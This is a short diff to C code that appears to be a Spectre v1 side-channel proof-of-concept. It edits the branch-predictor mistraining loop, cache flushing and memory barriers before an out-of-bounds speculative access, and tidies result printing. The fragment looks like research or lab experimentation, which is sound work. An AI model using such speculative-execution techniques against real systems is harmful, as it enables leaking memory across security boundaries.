@@ -28,11 +28,15 @@ int* spv1() {
     cp_t* arr = mmap_arr_cache_pages();
 
     //Misstrain branch predictor
-    for(int i = 0; i < accessible_pages; i++) victim_func(i, arr);
+    for(int i = 0; i < accessible_pages; i++) {
+        victim_func(i, arr);
+        flush(&arr[i]);
+        __sync_synchronize();
+    }
 
     //flush remnant data
-    flush_arr((void*)arr);
-    __sync_synchronize();
+    //flush_arr((void*)arr);
+    //__sync_synchronize();
 
     //access out of bounds
     victim_func(accessible_pages, arr);
@@ -44,13 +48,6 @@ int* spv1() {
 }
 
 void print_results(int** results) {
-    /*for(int i = 0; i < N_PAGES; i ++) {
-        printf("page %i: \t[", i);
-        for(int j = 0; j < REPETITIONS; j++) {
-            printf(("%4d, "), results[j][i]);
-        }
-        printf("]\n");
-    }*/
 
     printf("\t   page:");
     for(int p = 0; p < N_PAGES; p++) printf("%4d\t", p);
@@ -77,6 +74,7 @@ int main(int argc, char* argv[]) {
 
     for(int i = 0; i < REPETITIONS; i++) {
         results[i] = spv1();
+        __sync_synchronize();
     }
 
     print_results(results);
